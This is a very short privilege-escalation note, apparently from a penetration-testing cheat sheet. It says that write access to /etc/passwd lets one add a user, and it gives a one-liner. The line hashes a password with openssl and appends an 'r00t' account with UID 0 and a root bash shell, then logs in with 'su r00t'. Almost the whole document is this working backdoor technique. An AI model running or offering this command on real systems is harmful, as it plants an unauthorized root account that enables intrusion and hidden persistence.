# etc/password

If we have write-permissions to /etc/password, we can write a password to it:

```
pw=$(openssl passwd passw0rd123); echo "r00t:${pw}:0:0:root:/root:/bin/bash" >> /etc/passwd
```

And now we can login with `su r00t`.


